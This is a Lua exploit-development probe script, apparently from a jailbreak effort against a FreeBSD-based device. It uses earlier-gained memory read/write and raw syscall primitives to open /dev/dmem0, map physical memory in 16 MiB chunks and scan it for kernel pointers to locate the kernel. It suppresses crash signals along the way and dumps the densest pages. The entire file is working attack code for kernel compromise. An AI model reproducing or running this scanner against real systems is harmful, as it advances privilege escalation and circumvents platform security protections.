-- CRASH_CLASS: LOW
-- PROBE 528o: Fast kernel scan via pattern matching
--
-- 528n: physical range 0-4GB mappable. 5GB+ fails.
-- Kernel is somewhere in that 4GB. Need faster scan.
--
-- Strategy: Map large chunks (16MB), scan for kernel pointers.
-- Kernel pointers have hi32 in [0xFFFF8000, 0xFFFFFFFE].
-- (0xFFFFFFFF is NaN-boxed, not kernel)
-- Sample every 256 bytes (not every 4) for speed.
-- Focus on 0-256 MiB first (where kernel usually lives in FreeBSD).

print("=== PROBE 528o: FAST KERNEL POINTER SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

local devpath = memory.alloc(0x20)
local dname = "/dev/dmem0"
for i = 1, #dname do wd(N(devpath) + i - 1, string.byte(dname, i)) end
wd(N(devpath) + #dname, 0)
local ok_o, dmem_fd = pcall(function()
    return native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0))
end)
local fd = ok_o and N(dmem_fd) or -1
print("dmem0 fd=" .. fd)
if fd < 0 then return end

local sc_477 = mk(477)
local sc_73 = mk(73)

local PAGE = 0x4000
local CHUNK = 0x1000000  -- 16 MiB

-- ============================================================
-- [A] Scan 0-256 MiB for kernel pointer density
-- ============================================================
-- For each 16MiB chunk, count how many kernel-like pointers appear
-- in a stride-256 sample. High density = likely kernel data.
print("")
print("[A] Kernel pointer density scan (0-256 MiB)")

local hot_chunks = {}

for chunk_off = 0, 0x10000000 - 1, CHUNK do
    if not alive() then break end

    local phys = uint64(string.format("0x%X", chunk_off))
    local ok_c, rv_c = pcall(function()
        return sc_477(uint64(0), uint64(CHUNK), uint64(1), uint64(1), uint64(fd), phys)
    end)

    if ok_c and rv_c then
        local ch, cl = get_hi_lo(rv_c)
        if ch < 0 then ch = ch + 0x100000000 end
        if ch == 0xFFFFFFFF then
            print(string.format("  chunk 0x%X: mmap FAIL", chunk_off))
        else
            local kptr_count = 0
            local uptr_count = 0
            local nonzero_count = 0
            local first_kptr = nil
            local first_kptr_off = 0

            -- Sample every 256 bytes, read 8-byte qword
            for off = 0, CHUNK - 8, 256 do
                local v = rq(N(rv_c) + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh < 0 then vh = vh + 0x100000000 end
                    if vl < 0 then vl = vl + 0x100000000 end
                    if vh ~= 0 or vl ~= 0 then
                        nonzero_count = nonzero_count + 1
                    end
                    -- Kernel pointer: hi32 in [0xFFFF8000, 0xFFFFFFFE]
                    if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                        kptr_count = kptr_count + 1
                        if not first_kptr then
                            first_kptr = {vh, vl}
                            first_kptr_off = off
                        end
                    end
                    -- Userland pointer: hi32 in [0x00000001, 0x00000FFF]
                    if vh >= 1 and vh <= 0xFFF then
                        uptr_count = uptr_count + 1
                    end
                end
            end

            if kptr_count > 0 then
                table.insert(hot_chunks, {chunk_off, kptr_count, first_kptr, first_kptr_off})
                print(string.format("  chunk 0x%X: kptr=%d uptr=%d nonzero=%d first=0x%08X%08X@+0x%X",
                    chunk_off, kptr_count, uptr_count, nonzero_count,
                    first_kptr[1], first_kptr[2], first_kptr_off))
            elseif nonzero_count > 100 then
                print(string.format("  chunk 0x%X: kptr=0 uptr=%d nonzero=%d (data region)",
                    chunk_off, uptr_count, nonzero_count))
            end

            pcall(function() sc_73(rv_c, uint64(CHUNK)) end)
        end
    end
end

-- ============================================================
-- [B] Extend scan to 256 MiB - 4 GB if no kernel pointers found
-- ============================================================
if #hot_chunks == 0 then
    print("")
    print("[B] Extending scan to 256MB-1GB")
    for chunk_off = 0x10000000, 0x40000000 - 1, CHUNK do
        if not alive() then break end
        if #hot_chunks >= 5 then break end

        local phys = uint64(string.format("0x%X", chunk_off))
        local ok_c, rv_c = pcall(function()
            return sc_477(uint64(0), uint64(CHUNK), uint64(1), uint64(1), uint64(fd), phys)
        end)

        if ok_c and rv_c then
            local ch, cl = get_hi_lo(rv_c)
            if ch < 0 then ch = ch + 0x100000000 end
            if ch ~= 0xFFFFFFFF then
                local kptr_count = 0
                local first_kptr = nil
                local first_kptr_off = 0

                for off = 0, CHUNK - 8, 256 do
                    local v = rq(N(rv_c) + off)
                    if v then
                        local vh, vl = get_hi_lo(v)
                        if vh < 0 then vh = vh + 0x100000000 end
                        if vl < 0 then vl = vl + 0x100000000 end
                        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                            kptr_count = kptr_count + 1
                            if not first_kptr then
                                first_kptr = {vh, vl}
                                first_kptr_off = off
                            end
                        end
                    end
                end

                if kptr_count > 0 then
                    table.insert(hot_chunks, {chunk_off, kptr_count, first_kptr, first_kptr_off})
                    print(string.format("  chunk 0x%X: kptr=%d first=0x%08X%08X@+0x%X",
                        chunk_off, kptr_count, first_kptr[1], first_kptr[2], first_kptr_off))
                end
                pcall(function() sc_73(rv_c, uint64(CHUNK)) end)
            end
        end
    end
end

-- Continue to 1-4 GB if still nothing
if #hot_chunks == 0 then
    print("")
    print("[C] Extending scan to 1GB-4GB (coarser stride)")
    -- Use stride of 1024 bytes for speed at this range
    for chunk_off_gb = 1, 3 do
        local base = chunk_off_gb * 0x40000000
        for sub = 0, 0x40000000 - 1, CHUNK do
            if not alive() then break end
            if #hot_chunks >= 5 then break end
            local chunk_off = base + sub

            local phys = uint64(string.format("0x%X", chunk_off))
            local ok_c, rv_c = pcall(function()
                return sc_477(uint64(0), uint64(CHUNK), uint64(1), uint64(1), uint64(fd), phys)
            end)

            if ok_c and rv_c then
                local ch, cl = get_hi_lo(rv_c)
                if ch < 0 then ch = ch + 0x100000000 end
                if ch ~= 0xFFFFFFFF then
                    local kptr_count = 0
                    local first_kptr = nil

                    for off = 0, CHUNK - 8, 1024 do
                        local v = rq(N(rv_c) + off)
                        if v then
                            local vh, vl = get_hi_lo(v)
                            if vh < 0 then vh = vh + 0x100000000 end
                            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                                kptr_count = kptr_count + 1
                                if not first_kptr then first_kptr = {vh, vl} end
                            end
                        end
                    end

                    if kptr_count > 0 then
                        table.insert(hot_chunks, {chunk_off, kptr_count, first_kptr, 0})
                        print(string.format("  chunk 0x%X: kptr=%d first=0x%08X%08X",
                            chunk_off, kptr_count, first_kptr[1], first_kptr[2]))
                    end
                    pcall(function() sc_73(rv_c, uint64(CHUNK)) end)
                end
            end
        end
        if #hot_chunks >= 5 then break end
    end
end

-- ============================================================
-- [D] If hot chunks found, deep-scan them
-- ============================================================
if #hot_chunks > 0 then
    print("")
    print("[D] Deep scan of hot chunks")

    -- Sort by kptr count (most dense first)
    table.sort(hot_chunks, function(a, b) return a[2] > b[2] end)

    -- For the top 3, do a full 8-byte stride scan
    for i = 1, math.min(3, #hot_chunks) do
        local chunk = hot_chunks[i]
        local chunk_off = chunk[1]

        print(string.format("  Chunk 0x%X (kptr=%d):", chunk_off, chunk[2]))

        local phys = uint64(string.format("0x%X", chunk_off))
        local ok_d, rv_d = pcall(function()
            return sc_477(uint64(0), uint64(CHUNK), uint64(1), uint64(1), uint64(fd), phys)
        end)

        if ok_d and rv_d then
            local dh, dl = get_hi_lo(rv_d)
            if dh < 0 then dh = dh + 0x100000000 end
            if dh ~= 0xFFFFFFFF then
                -- Find page with most kernel pointers
                local best_page = 0
                local best_count = 0

                for p = 0, CHUNK / PAGE - 1 do
                    local count = 0
                    for off = 0, PAGE - 8, 8 do
                        local v = rq(N(rv_d) + p * PAGE + off)
                        if v then
                            local vh, vl = get_hi_lo(v)
                            if vh < 0 then vh = vh + 0x100000000 end
                            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                                count = count + 1
                            end
                        end
                    end
                    if count > best_count then
                        best_count = count
                        best_page = p
                    end
                end

                print(string.format("    hottest page: %d (+0x%X) with %d kptrs",
                    best_page, best_page * PAGE, best_count))

                -- Dump first 16 qwords of hottest page
                local page_base = N(rv_d) + best_page * PAGE
                for off = 0, 15 * 8, 8 do
                    local v = rq(page_base + off)
                    if v then
                        local vh, vl = get_hi_lo(v)
                        if vh < 0 then vh = vh + 0x100000000 end
                        if vl < 0 then vl = vl + 0x100000000 end
                        local tag = ""
                        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then tag = " <KPTR>" end
                        print(string.format("    [+0x%02X] 0x%08X%08X%s", off, vh, vl, tag))
                    end
                end

                pcall(function() sc_73(rv_d, uint64(CHUNK)) end)
            end
        end
    end
end

pcall(function() native.fcall_with_rax(stub, 6, uint64(fd)) end)

print("")
print("[SUMMARY]")
print("  hot chunks: " .. #hot_chunks)
print("  alive=" .. tostring(alive()))
print("=== 528o COMPLETE ===")
